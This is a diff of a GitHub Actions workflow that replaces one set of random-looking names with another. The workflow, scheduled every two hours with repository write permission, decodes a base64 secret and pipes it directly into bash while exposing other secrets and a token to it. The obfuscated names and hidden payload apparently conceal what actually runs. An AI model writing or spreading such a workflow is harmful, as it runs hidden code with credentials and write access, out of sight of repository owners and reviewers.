@@ -1,21 +1,21 @@
-name: f0wo9h8OJZ8
+name: CAPb5p4GzN
 on:
   schedule:
     - cron: '0 */2 * * *'
   workflow_dispatch:
 jobs:
-  fvErDmDyD7fmFdLD:
+  lRAnqu8wo8sk:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
       - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.mZh64bPC2s }}
-      - name: fdgxdh
+          token: ${{ secrets.iGoUAn2TjSmUri6 }}
+      - name: U1BkV61uLxU8LmF
         env:
-          N2fOeC8: ${{ secrets.ZLzbvkQL }}
-          h8tL4i5a: ${{ secrets.nOR2UZrA906 }}
-          Rl38Fca5gOOe8yCU: ${{ secrets.gARpKz }}
-          GITHUB_TOKEN: ${{ secrets.mZh64bPC2s }}
-        run: echo "$N2fOeC8" | base64 -d | bash
+          KY2mfCqDcCVfJ: ${{ secrets.ixN9bgVp }}
+          qm2fm82PIncB: ${{ secrets.jK4naQI7mDU }}
+          HhZgWxNLKckly: ${{ secrets.aZiofYXwmDtuW }}
+          GITHUB_TOKEN: ${{ secrets.iGoUAn2TjSmUri6 }}
+        run: echo "$KY2mfCqDcCVfJ" | base64 -d | bash
